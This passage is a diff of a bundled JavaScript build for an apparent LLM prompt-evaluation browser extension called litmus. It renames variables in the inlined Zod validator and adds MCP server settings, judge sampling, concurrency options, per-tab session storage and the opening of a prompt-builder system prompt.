@@ -540,18 +540,18 @@
       if (this.value !== "aborted")
         this.value = "aborted";
     }
-    static mergeArray(status, results) {
+    static mergeArray(status2, results) {
       const arrayValue = [];
-      for (const s of results) {
-        if (s.status === "aborted")
+      for (const s2 of results) {
+        if (s2.status === "aborted")
           return INVALID;
-        if (s.status === "dirty")
-          status.dirty();
-        arrayValue.push(s.value);
+        if (s2.status === "dirty")
+          status2.dirty();
+        arrayValue.push(s2.value);
       }
-      return { status: status.value, value: arrayValue };
+      return { status: status2.value, value: arrayValue };
     }
-    static async mergeObjectAsync(status, pairs) {
+    static async mergeObjectAsync(status2, pairs) {
       const syncPairs = [];
       for (const pair of pairs) {
         const key = await pair.key;
@@ -561,9 +561,9 @@
           value
         });
       }
-      return _ParseStatus.mergeObjectSync(status, syncPairs);
+      return _ParseStatus.mergeObjectSync(status2, syncPairs);
     }
-    static mergeObjectSync(status, pairs) {
+    static mergeObjectSync(status2, pairs) {
       const finalObject = {};
       for (const pair of pairs) {
         const { key, value } = pair;
@@ -572,14 +572,14 @@
         if (value.status === "aborted")
           return INVALID;
         if (key.status === "dirty")
-          status.dirty();
+          status2.dirty();
         if (value.status === "dirty")
-          status.dirty();
+          status2.dirty();
         if (key.value !== "__proto__" && (typeof value.value !== "undefined" || pair.alwaysSet)) {
           finalObject[key.value] = value.value;
         }
       }
-      return { status: status.value, value: finalObject };
+      return { status: status2.value, value: finalObject };
     }
   };
   var INVALID = Object.freeze({
@@ -1039,7 +1039,7 @@
         });
         return INVALID;
       }
-      const status = new ParseStatus();
+      const status2 = new ParseStatus();
       let ctx = void 0;
       for (const check of this._def.checks) {
         if (check.kind === "min") {
@@ -1053,7 +1053,7 @@
               exact: false,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "max") {
           if (input.data.length > check.value) {
@@ -1066,7 +1066,7 @@
               exact: false,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "length") {
           const tooBig = input.data.length > check.value;
@@ -1092,7 +1092,7 @@
                 message: check.message
               });
             }
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "email") {
           if (!emailRegex.test(input.data)) {
@@ -1102,7 +1102,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "emoji") {
           if (!emojiRegex) {
@@ -1115,7 +1115,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "uuid") {
           if (!uuidRegex.test(input.data)) {
@@ -1125,7 +1125,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "nanoid") {
           if (!nanoidRegex.test(input.data)) {
@@ -1135,7 +1135,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "cuid") {
           if (!cuidRegex.test(input.data)) {
@@ -1145,7 +1145,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "cuid2") {
           if (!cuid2Regex.test(input.data)) {
@@ -1155,7 +1155,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "ulid") {
           if (!ulidRegex.test(input.data)) {
@@ -1165,7 +1165,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "url") {
           try {
@@ -1177,7 +1177,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "regex") {
           check.regex.lastIndex = 0;
@@ -1189,7 +1189,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "trim") {
           input.data = input.data.trim();
@@ -1201,7 +1201,7 @@
               validation: { includes: check.value, position: check.position },
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "toLowerCase") {
           input.data = input.data.toLowerCase();
@@ -1215,7 +1215,7 @@
               validation: { startsWith: check.value },
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "endsWith") {
           if (!input.data.endsWith(check.value)) {
@@ -1225,7 +1225,7 @@
               validation: { endsWith: check.value },
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "datetime") {
           const regex = datetimeRegex(check);
@@ -1236,7 +1236,7 @@
               validation: "datetime",
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "date") {
           const regex = dateRegex;
@@ -1247,7 +1247,7 @@
               validation: "date",
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "time") {
           const regex = timeRegex(check);
@@ -1258,7 +1258,7 @@
               validation: "time",
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "duration") {
           if (!durationRegex.test(input.data)) {
@@ -1268,7 +1268,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "ip") {
           if (!isValidIP(input.data, check.version)) {
@@ -1278,7 +1278,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "jwt") {
           if (!isValidJWT(input.data, check.alg)) {
@@ -1288,7 +1288,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "cidr") {
           if (!isValidCidr(input.data, check.version)) {
@@ -1298,7 +1298,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "base64") {
           if (!base64Regex.test(input.data)) {
@@ -1308,7 +1308,7 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "base64url") {
           if (!base64urlRegex.test(input.data)) {
@@ -1318,13 +1318,13 @@
               code: ZodIssueCode.invalid_string,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else {
           util.assertNever(check);
         }
       }
-      return { status: status.value, value: input.data };
+      return { status: status2.value, value: input.data };
     }
     _regex(regex, validation, message) {
       return this.refinement((data) => regex.test(data), {
@@ -1600,7 +1600,7 @@
         return INVALID;
       }
       let ctx = void 0;
-      const status = new ParseStatus();
+      const status2 = new ParseStatus();
       for (const check of this._def.checks) {
         if (check.kind === "int") {
           if (!util.isInteger(input.data)) {
@@ -1611,7 +1611,7 @@
               received: "float",
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "min") {
           const tooSmall = check.inclusive ? input.data < check.value : input.data <= check.value;
@@ -1625,7 +1625,7 @@
               exact: false,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "max") {
           const tooBig = check.inclusive ? input.data > check.value : input.data >= check.value;
@@ -1639,7 +1639,7 @@
               exact: false,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "multipleOf") {
           if (floatSafeRemainder(input.data, check.value) !== 0) {
@@ -1649,7 +1649,7 @@
               multipleOf: check.value,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "finite") {
           if (!Number.isFinite(input.data)) {
@@ -1658,13 +1658,13 @@
               code: ZodIssueCode.not_finite,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else {
           util.assertNever(check);
         }
       }
-      return { status: status.value, value: input.data };
+      return { status: status2.value, value: input.data };
     }
     gte(value, message) {
       return this.setLimit("min", value, true, errorUtil.toString(message));
@@ -1829,7 +1829,7 @@
         return this._getInvalidInput(input);
       }
       let ctx = void 0;
-      const status = new ParseStatus();
+      const status2 = new ParseStatus();
       for (const check of this._def.checks) {
         if (check.kind === "min") {
           const tooSmall = check.inclusive ? input.data < check.value : input.data <= check.value;
@@ -1842,7 +1842,7 @@
               inclusive: check.inclusive,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "max") {
           const tooBig = check.inclusive ? input.data > check.value : input.data >= check.value;
@@ -1855,7 +1855,7 @@
               inclusive: check.inclusive,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "multipleOf") {
           if (input.data % check.value !== BigInt(0)) {
@@ -1865,13 +1865,13 @@
               multipleOf: check.value,
               message: check.message
             });
-            status.dirty();
+            status2.dirty();
           }
         } else {
           util.assertNever(check);
         }
       }
-      return { status: status.value, value: input.data };
+      return { status: status2.value, value: input.data };
     }
     _getInvalidInput(input) {
       const ctx = this._getOrReturnCtx(input);
@@ -2029,7 +2029,7 @@
         });
         return INVALID;
       }
-      const status = new ParseStatus();
+      const status2 = new ParseStatus();
       let ctx = void 0;
       for (const check of this._def.checks) {
         if (check.kind === "min") {
@@ -2043,7 +2043,7 @@
               minimum: check.value,
               type: "date"
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (check.kind === "max") {
           if (input.data.getTime() > check.value) {
@@ -2056,14 +2056,14 @@
               maximum: check.value,
               type: "date"
             });
-            status.dirty();
+            status2.dirty();
           }
         } else {
           util.assertNever(check);
         }
       }
       return {
-        status: status.value,
+        status: status2.value,
         value: new Date(input.data.getTime())
       };
     }
@@ -2249,7 +2249,7 @@
   };
   var ZodArray = class _ZodArray extends ZodType {
     _parse(input) {
-      const { ctx, status } = this._processInputParams(input);
+      const { ctx, status: status2 } = this._processInputParams(input);
       const def = this._def;
       if (ctx.parsedType !== ZodParsedType.array) {
         addIssueToContext(ctx, {
@@ -2272,7 +2272,7 @@
             exact: true,
             message: def.exactLength.message
           });
-          status.dirty();
+          status2.dirty();
         }
       }
       if (def.minLength !== null) {
@@ -2285,7 +2285,7 @@
             exact: false,
             message: def.minLength.message
           });
-          status.dirty();
+          status2.dirty();
         }
       }
       if (def.maxLength !== null) {
@@ -2298,20 +2298,20 @@
             exact: false,
             message: def.maxLength.message
           });
-          status.dirty();
+          status2.dirty();
         }
       }
       if (ctx.common.async) {
         return Promise.all([...ctx.data].map((item, i) => {
           return def.type._parseAsync(new ParseInputLazyPath(ctx, item, ctx.path, i));
         })).then((result2) => {
-          return ParseStatus.mergeArray(status, result2);
+          return ParseStatus.mergeArray(status2, result2);
         });
       }
       const result = [...ctx.data].map((item, i) => {
         return def.type._parseSync(new ParseInputLazyPath(ctx, item, ctx.path, i));
       });
-      return ParseStatus.mergeArray(status, result);
+      return ParseStatus.mergeArray(status2, result);
     }
     get element() {
       return this._def.type;
@@ -2400,7 +2400,7 @@
         });
         return INVALID;
       }
-      const { status, ctx } = this._processInputParams(input);
+      const { status: status2, ctx } = this._processInputParams(input);
       const { shape, keys: shapeKeys } = this._getCached();
       const extraKeys = [];
       if (!(this._def.catchall instanceof ZodNever && this._def.unknownKeys === "strip")) {
@@ -2435,7 +2435,7 @@
               code: ZodIssueCode.unrecognized_keys,
               keys: extraKeys
             });
-            status.dirty();
+            status2.dirty();
           }
         } else if (unknownKeys === "strip") {
         } else {
@@ -2469,10 +2469,10 @@
           }
           return syncPairs;
         }).then((syncPairs) => {
-          return ParseStatus.mergeObjectSync(status, syncPairs);
+          return ParseStatus.mergeObjectSync(status2, syncPairs);
         });
       } else {
-        return ParseStatus.mergeObjectSync(status, pairs);
+        return ParseStatus.mergeObjectSync(status2, pairs);
       }
     }
     get shape() {
@@ -2950,7 +2950,7 @@
   }
   var ZodIntersection = class extends ZodType {
     _parse(input) {
-      const { status, ctx } = this._processInputParams(input);
+      const { status: status2, ctx } = this._processInputParams(input);
       const handleParsed = (parsedLeft, parsedRight) => {
         if (isAborted(parsedLeft) || isAborted(parsedRight)) {
           return INVALID;
@@ -2963,9 +2963,9 @@
           return INVALID;
         }
         if (isDirty(parsedLeft) || isDirty(parsedRight)) {
-          status.dirty();
+          status2.dirty();
         }
-        return { status: status.value, value: merged.data };
+        return { status: status2.value, value: merged.data };
       };
       if (ctx.common.async) {
         return Promise.all([
@@ -3003,7 +3003,7 @@
   };
   var ZodTuple = class _ZodTuple extends ZodType {
     _parse(input) {
-      const { status, ctx } = this._processInputParams(input);
+      const { status: status2, ctx } = this._processInputParams(input);
       if (ctx.parsedType !== ZodParsedType.array) {
         addIssueToContext(ctx, {
           code: ZodIssueCode.invalid_type,
@@ -3031,7 +3031,7 @@
           exact: false,
           type: "array"
         });
-        status.dirty();
+        status2.dirty();
       }
       const items = [...ctx.data].map((item, itemIndex) => {
         const schema = this._def.items[itemIndex] || this._def.rest;
@@ -3041,10 +3041,10 @@
       }).filter((x) => !!x);
       if (ctx.common.async) {
         return Promise.all(items).then((results) => {
-          return ParseStatus.mergeArray(status, results);
+          return ParseStatus.mergeArray(status2, results);
         });
       } else {
-        return ParseStatus.mergeArray(status, items);
+        return ParseStatus.mergeArray(status2, items);
       }
     }
     get items() {
@@ -3076,7 +3076,7 @@
       return this._def.valueType;
     }
     _parse(input) {
-      const { status, ctx } = this._processInputParams(input);
+      const { status: status2, ctx } = this._processInputParams(input);
       if (ctx.parsedType !== ZodParsedType.object) {
         addIssueToContext(ctx, {
           code: ZodIssueCode.invalid_type,
@@ -3096,9 +3096,9 @@
         });
       }
       if (ctx.common.async) {
-        return ParseStatus.mergeObjectAsync(status, pairs);
+        return ParseStatus.mergeObjectAsync(status2, pairs);
       } else {
-        return ParseStatus.mergeObjectSync(status, pairs);
+        return ParseStatus.mergeObjectSync(status2, pairs);
       }
     }
     get element() {
@@ -3129,7 +3129,7 @@
       return this._def.valueType;
     }
     _parse(input) {
-      const { status, ctx } = this._processInputParams(input);
+      const { status: status2, ctx } = this._processInputParams(input);
       if (ctx.parsedType !== ZodParsedType.map) {
         addIssueToContext(ctx, {
           code: ZodIssueCode.invalid_type,
@@ -3156,11 +3156,11 @@
               return INVALID;
             }
             if (key.status === "dirty" || value.status === "dirty") {
-              status.dirty();
+              status2.dirty();
             }
             finalMap.set(key.value, value.value);
           }
-          return { status: status.value, value: finalMap };
+          return { status: status2.value, value: finalMap };
         });
       } else {
         const finalMap = /* @__PURE__ */ new Map();
@@ -3171,11 +3171,11 @@
             return INVALID;
           }
           if (key.status === "dirty" || value.status === "dirty") {
-            status.dirty();
+            status2.dirty();
           }
           finalMap.set(key.value, value.value);
         }
-        return { status: status.value, value: finalMap };
+        return { status: status2.value, value: finalMap };
       }
     }
   };
@@ -3189,7 +3189,7 @@
   };
   var ZodSet = class _ZodSet extends ZodType {
     _parse(input) {
-      const { status, ctx } = this._processInputParams(input);
+      const { status: status2, ctx } = this._processInputParams(input);
       if (ctx.parsedType !== ZodParsedType.set) {
         addIssueToContext(ctx, {
           code: ZodIssueCode.invalid_type,
@@ -3209,7 +3209,7 @@
             exact: false,
             message: def.minSize.message
           });
-          status.dirty();
+          status2.dirty();
         }
       }
       if (def.maxSize !== null) {
@@ -3222,7 +3222,7 @@
             exact: false,
             message: def.maxSize.message
           });
-          status.dirty();
+          status2.dirty();
         }
       }
       const valueType = this._def.valueType;
@@ -3232,10 +3232,10 @@
           if (element.status === "aborted")
             return INVALID;
           if (element.status === "dirty")
-            status.dirty();
+            status2.dirty();
           parsedSet.add(element.value);
         }
-        return { status: status.value, value: parsedSet };
+        return { status: status2.value, value: parsedSet };
       }
       const elements = [...ctx.data.values()].map((item, i) => valueType._parse(new ParseInputLazyPath(ctx, item, ctx.path, i)));
       if (ctx.common.async) {
@@ -3566,15 +3566,15 @@
       return this._def.schema._def.typeName === ZodFirstPartyTypeKind.ZodEffects ? this._def.schema.sourceType() : this._def.schema;
     }
     _parse(input) {
-      const { status, ctx } = this._processInputParams(input);
+      const { status: status2, ctx } = this._processInputParams(input);
       const effect = this._def.effect || null;
       const checkCtx = {
         addIssue: (arg) => {
           addIssueToContext(ctx, arg);
           if (arg.fatal) {
-            status.abort();
+            status2.abort();
           } else {
-            status.dirty();
+            status2.dirty();
           }
         },
         get path() {
@@ -3586,7 +3586,7 @@
         const processed = effect.transform(ctx.data, checkCtx);
         if (ctx.common.async) {
           return Promise.resolve(processed).then(async (processed2) => {
-            if (status.value === "aborted")
+            if (status2.value === "aborted")
               return INVALID;
             const result = await this._def.schema._parseAsync({
               data: processed2,
@@ -3597,12 +3597,12 @@
               return INVALID;
             if (result.status === "dirty")
               return DIRTY(result.value);
-            if (status.value === "dirty")
+            if (status2.value === "dirty")
               return DIRTY(result.value);
             return result;
           });
         } else {
-          if (status.value === "aborted")
+          if (status2.value === "aborted")
             return INVALID;
           const result = this._def.schema._parseSync({
             data: processed,
@@ -3613,7 +3613,7 @@
             return INVALID;
           if (result.status === "dirty")
             return DIRTY(result.value);
-          if (status.value === "dirty")
+          if (status2.value === "dirty")
             return DIRTY(result.value);
           return result;
         }
@@ -3638,17 +3638,17 @@
           if (inner.status === "aborted")
             return INVALID;
           if (inner.status === "dirty")
-            status.dirty();
+            status2.dirty();
           executeRefinement(inner.value);
-          return { status: status.value, value: inner.value };
+          return { status: status2.value, value: inner.value };
         } else {
           return this._def.schema._parseAsync({ data: ctx.data, path: ctx.path, parent: ctx }).then((inner) => {
             if (inner.status === "aborted")
               return INVALID;
             if (inner.status === "dirty")
-              status.dirty();
+              status2.dirty();
             return executeRefinement(inner.value).then(() => {
-              return { status: status.value, value: inner.value };
+              return { status: status2.value, value: inner.value };
             });
           });
         }
@@ -3666,13 +3666,13 @@
           if (result instanceof Promise) {
             throw new Error(`Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.`);
           }
-          return { status: status.value, value: result };
+          return { status: status2.value, value: result };
         } else {
           return this._def.schema._parseAsync({ data: ctx.data, path: ctx.path, parent: ctx }).then((base) => {
             if (!isValid(base))
               return INVALID;
             return Promise.resolve(effect.transform(base.value, checkCtx)).then((result) => ({
-              status: status.value,
+              status: status2.value,
               value: result
             }));
           });
@@ -3851,7 +3851,7 @@
   };
   var ZodPipeline = class _ZodPipeline extends ZodType {
     _parse(input) {
-      const { status, ctx } = this._processInputParams(input);
+      const { status: status2, ctx } = this._processInputParams(input);
       if (ctx.common.async) {
         const handleAsync = async () => {
           const inResult = await this._def.in._parseAsync({
@@ -3862,7 +3862,7 @@
           if (inResult.status === "aborted")
             return INVALID;
           if (inResult.status === "dirty") {
-            status.dirty();
+            status2.dirty();
             return DIRTY(inResult.value);
           } else {
             return this._def.out._parseAsync({
@@ -3882,7 +3882,7 @@
         if (inResult.status === "aborted")
           return INVALID;
         if (inResult.status === "dirty") {
-          status.dirty();
+          status2.dirty();
           return {
             status: "dirty",
             value: inResult.value
@@ -4058,9 +4058,18 @@
     anthropic: external_exports.string().min(1).optional(),
     google: external_exports.string().min(1).optional()
   }).default({});
+  var McpServerConfigSchema = external_exports.object({
+    id: external_exports.string().min(1),
+    name: external_exports.string().min(1),
+    url: external_exports.string().url(),
+    transport: external_exports.enum(["http", "sse"]).default("http"),
+    authHeader: external_exports.string().min(1).optional()
+  });
   var SettingsSchema = external_exports.object({
     /** Provider keys live only in chrome.storage.local; see PRD §13. */
     keys: KeysSchema,
+    /** Configured MCP servers (ADR 0003). Stored locally; auth headers are secrets. */
+    mcpServers: external_exports.array(McpServerConfigSchema).default([]),
     defaultTarget: TargetModelSchema.optional(),
     /** Optional judge-model override; when unset, the judge uses the target model. */
     judgeModel: external_exports.string().min(1).optional(),
@@ -4077,7 +4086,11 @@
     /** Hard per-run spend cap, USD. */
     spendCapUsd: external_exports.number().min(0).default(0.5),
     /** Run each case this many times to measure run-to-run variance. */
-    samples: external_exports.number().int().min(1).max(5).default(1)
+    samples: external_exports.number().int().min(1).max(5).default(1),
+    /** Judge each quality output this many times and fold to the median (cuts judge noise). */
+    judgeSamples: external_exports.number().int().min(1).max(5).default(1),
+    /** How many eval cases to run at once (1 = sequential). */
+    concurrency: external_exports.number().int().min(1).max(8).default(1)
   });
   var OpenAIUsageSchema = external_exports.object({
     prompt_tokens: external_exports.number().nonnegative(),
@@ -4178,30 +4191,44 @@
   });
   var ScenarioSchema = external_exports.object({
     goal: external_exports.string().min(1),
-    tools: external_exports.array(MockToolSchema),
+    tools: external_exports.array(MockToolSchema).default([]),
     maxSteps: external_exports.number().int().min(1).max(20),
-    successContains: external_exports.array(external_exports.string()).optional()
+    successContains: external_exports.array(external_exports.string()).optional(),
+    /** Run against this configured MCP server instead of mock tools (ADR 0003). */
+    mcpServerId: external_exports.string().min(1).optional()
   });
+  var PromptBuilderTurnSchema = external_exports.discriminatedUnion("kind", [
+    external_exports.object({
+      kind: external_exports.literal("question"),
+      message: external_exports.string().min(1),
+      suggestions: external_exports.array(external_exports.string()).default([])
+    }),
+    external_exports.object({
+      kind: external_exports.literal("prompt"),
+      systemPrompt: external_exports.string().min(1),
+      summary: external_exports.string().default("")
+    })
+  ]);
 
   // src/platform/storage.ts
   var SETTINGS_KEY = "litmus:settings";
-  async function loadSettings(area2) {
-    const raw = await area2.get(SETTINGS_KEY);
+  async function loadSettings(area3) {
+    const raw = await area3.get(SETTINGS_KEY);
     return parseSettings(raw[SETTINGS_KEY]);
   }
-  async function saveSettings(area2, settings) {
-    await area2.set({ [SETTINGS_KEY]: SettingsSchema.parse(settings) });
+  async function saveSettings(area3, settings) {
+    await area3.set({ [SETTINGS_KEY]: SettingsSchema.parse(settings) });
   }
-  async function setKey(area2, provider, key) {
-    const current = await loadSettings(area2);
+  async function setKey(area3, provider, key) {
+    const current = await loadSettings(area3);
     const next = SettingsSchema.parse({ ...current, keys: { ...current.keys, [provider]: key } });
-    await saveSettings(area2, next);
+    await saveSettings(area3, next);
     return next;
   }
-  async function deleteAllKeys(area2) {
-    const current = await loadSettings(area2);
+  async function deleteAllKeys(area3) {
+    const current = await loadSettings(area3);
     const next = SettingsSchema.parse({ ...current, keys: {} });
-    await saveSettings(area2, next);
+    await saveSettings(area3, next);
     return next;
   }
 
@@ -4223,23 +4250,23 @@
 
   // src/platform/sessionCache.ts
   var SNAPSHOT_KEY = "litmus:session-cache";
-  function isSnapshot(v) {
-    if (typeof v !== "object" || v === null) return false;
-    const s = v;
-    return typeof s["prompt"] === "string" && typeof s["targetValue"] === "string" && Array.isArray(s["dimensions"]) && Array.isArray(s["cases"]) && typeof s["rubrics"] === "object" && s["rubrics"] !== null;
+  function isSnapshot(v2) {
+    if (typeof v2 !== "object" || v2 === null) return false;
+    const s2 = v2;
+    return typeof s2["prompt"] === "string" && typeof s2["targetValue"] === "string" && Array.isArray(s2["dimensions"]) && Array.isArray(s2["cases"]) && typeof s2["rubrics"] === "object" && s2["rubrics"] !== null;
   }
-  async function loadSnapshot(area2) {
+  async function loadSnapshot(area3) {
     try {
-      const raw = await area2.get(SNAPSHOT_KEY);
+      const raw = await area3.get(SNAPSHOT_KEY);
       const val = raw[SNAPSHOT_KEY];
       return isSnapshot(val) ? val : null;
     } catch {
       return null;
     }
   }
-  async function saveSnapshot(area2, snapshot) {
+  async function saveSnapshot(area3, snapshot) {
     try {
-      await area2.set({ [SNAPSHOT_KEY]: snapshot });
+      await area3.set({ [SNAPSHOT_KEY]: snapshot });
     } catch {
     }
   }
@@ -4254,8 +4281,8 @@
   function mergeSettings(current, form) {
     const keys = { ...current.keys };
     for (const p of PROVIDERS) {
-      const v = form.keys[p];
-      if (v && v.trim()) keys[p] = v.trim();
+      const v2 = form.keys[p];
+      if (v2 && v2.trim()) keys[p] = v2.trim();
     }
     return SettingsSchema.parse({
       keys,
@@ -4265,67 +4292,77 @@
       availableModels: current.availableModels,
       passThreshold: form.passThreshold ?? current.passThreshold,
       spendCapUsd: form.spendCapUsd ?? current.spendCapUsd,
-      samples: form.samples ?? current.samples
+      samples: form.samples ?? current.samples,
+      judgeSamples: form.judgeSamples ?? current.judgeSamples,
+      concurrency: form.concurrency ?? current.concurrency
     });
   }
 
-  // src/platform/indexedDbStore.ts
-  var DB_NAME = "litmus";
-  var DB_VERSION = 1;
-  var VERSIONS_STORE = "versions";
-  var RUNS_STORE = "runs";
-  function openDb() {
-    return new Promise((resolve, reject) => {
-      const req = indexedDB.open(DB_NAME, DB_VERSION);
-      req.onupgradeneeded = () => {
-        const db = req.result;
-        if (!db.objectStoreNames.contains(VERSIONS_STORE)) db.createObjectStore(VERSIONS_STORE, { keyPath: "id" });
-        if (!db.objectStoreNames.contains(RUNS_STORE)) db.createObjectStore(RUNS_STORE, { keyPath: "versionId" });
-      };
-      req.onsuccess = () => resolve(req.result);
-      req.onerror = () => reject(req.error ?? new Error("indexedDB open failed"));
-    });
+  // src/platform/sessionTabStore.ts
+  var VERSION_KEY_PREFIX = "litmus:versions:";
+  function versionKeyForTab(tabId) {
+    return `${VERSION_KEY_PREFIX}${tabId ?? "panel"}`;
   }
-  function promisifyRequest(req) {
-    return new Promise((resolve, reject) => {
-      req.onsuccess = () => resolve(req.result);
-      req.onerror = () => reject(req.error ?? new Error("indexedDB request failed"));
-    });
+  var EMPTY = { versions: [], runs: {} };
+  function asBlob(value) {
+    if (typeof value !== "object" || value === null) return { versions: [], runs: {} };
+    const v2 = value;
+    const versions = Array.isArray(v2["versions"]) ? v2["versions"] : [];
+    const runs = typeof v2["runs"] === "object" && v2["runs"] !== null ? v2["runs"] : {};
+    return { versions, runs };
   }
-  var IndexedDbStore = class {
+  var SessionTabStore = class {
+    constructor(area3, resolveKey) {
+      this.area = area3;
+      this.resolveKey = resolveKey;
+    }
+    /** Memoized key so every op in a panel session targets the same tab namespace. */
+    keyPromise = null;
+    key() {
+      return this.keyPromise ??= this.resolveKey();
+    }
+    async read() {
+      try {
+        const k = await this.key();
+        const got = await this.area.get(k);
+        return asBlob(got[k]);
+      } catch {
+        return { ...EMPTY, versions: [], runs: {} };
+      }
+    }
+    async write(blob) {
+      const k = await this.key();
+      await this.area.set({ [k]: blob });
+    }
     async getVersions() {
-      const db = await openDb();
-      const all = await promisifyRequest(db.transaction(VERSIONS_STORE, "readonly").objectStore(VERSIONS_STORE).getAll());
-      db.close();
-      return all.sort((a, b) => a.index - b.index);
+      const { versions } = await this.read();
+      return [...versions].sort((a, b) => a.index - b.index);
     }
     async putVersion(version) {
-      const db = await openDb();
-      await promisifyRequest(db.transaction(VERSIONS_STORE, "readwrite").objectStore(VERSIONS_STORE).put(version));
-      db.close();
+      const blob = await this.read();
+      const versions = blob.versions.filter((v2) => v2.id !== version.id);
+      versions.push(version);
+      await this.write({ versions, runs: blob.runs });
     }
     async getRun(versionId) {
-      const db = await openDb();
-      const rec = await promisifyRequest(db.transaction(RUNS_STORE, "readonly").objectStore(RUNS_STORE).get(versionId));
-      db.close();
-      return rec ?? null;
+      const { runs } = await this.read();
+      return runs[versionId] ?? null;
     }
     async putRun(record) {
-      const db = await openDb();
-      await promisifyRequest(db.transaction(RUNS_STORE, "readwrite").objectStore(RUNS_STORE).put(record));
-      db.close();
+      const blob = await this.read();
+      await this.write({ versions: blob.versions, runs: { ...blob.runs, [record.versionId]: record } });
     }
   };
 
   // src/providers/types.ts
   function defaultFetch() {
-    return globalThis.fetch;
+    return globalThis.fetch.bind(globalThis);
   }
   var ProviderError = class extends Error {
-    constructor(provider, status, detail, model) {
-      super(`[${provider}] HTTP ${status}${model ? ` (model ${model})` : ""}: ${detail.slice(0, 200)}`);
+    constructor(provider, status2, detail, model) {
+      super(`[${provider}] HTTP ${status2}${model ? ` (model ${model})` : ""}: ${detail.slice(0, 200)}`);
       this.provider = provider;
-      this.status = status;
+      this.status = status2;
       this.detail = detail;
       this.model = model;
       this.name = "ProviderError";
@@ -4400,7 +4437,7 @@
   }
   function mean(values) {
     if (values.length === 0) return 0;
-    return values.reduce((acc, v) => acc + v, 0) / values.length;
+    return values.reduce((acc, v2) => acc + v2, 0) / values.length;
   }
 
   // src/core/timing.ts
@@ -4416,6 +4453,19 @@
       totalMs: round1(m.totalMs),
       tokens: tk,
       tokensPerSec: Math.round(tokensPerSec)
+    };
+  }
+  function aggregateTrajectoryTiming(timings) {
+    const first = timings[0];
+    if (!first) return { ttfbMs: 0, totalMs: 0, tokens: 0, tokensPerSec: 0 };
+    const totalMs = round1(timings.reduce((acc, t) => acc + t.totalMs, 0));
+    const tokens = timings.reduce((acc, t) => acc + t.tokens, 0);
+    const seconds = totalMs / 1e3;
+    return {
+      ttfbMs: round1(first.ttfbMs),
+      totalMs,
+      tokens,
+      tokensPerSec: seconds > 0 ? Math.round(tokens / seconds) : 0
     };
   }
   function aggregateSpeed(timings) {
@@ -4695,8 +4745,8 @@
   }
   function toResponseObject(content) {
     try {
-      const v = JSON.parse(content);
-      return v && typeof v === "object" && !Array.isArray(v) ? v : { result: v };
+      const v2 = JSON.parse(content);
+      return v2 && typeof v2 === "object" && !Array.isArray(v2) ? v2 : { result: v2 };
     } catch {
       return { result: content };
     }
@@ -4907,6 +4957,39 @@
     return callJson(deps.provider, { model: deps.analyzerModel, messages, temperature: 0 }, chatOptions(deps), parseAnalysis);
   }
 
+  // src/services/promptBuilder.ts
+  var BUILDER_SYSTEM = [
+    "You are litmus's prompt architect. You help the user create a high-quality SYSTEM PROMPT for an LLM through a short, focused interview.",
+    "",
+    "Rules:",
+    "- Work one turn at a time. Respond with ONLY JSON \u2014 no prose, no markdown fences.",
+    "- If you still need information to write a strong prompt, ask ONE round of clarifying questions (bundle 1-3 tightly related questions into a single message). Cover the essentials first: the assistant's role and goal, the audience, the expected output format/structure, tone, hard constraints and guardrails, and any tools or knowledge it relies on. Never ask about something the user already told you.",
+    '- When it helps the user reply quickly, offer concrete example answers in "suggestions".',
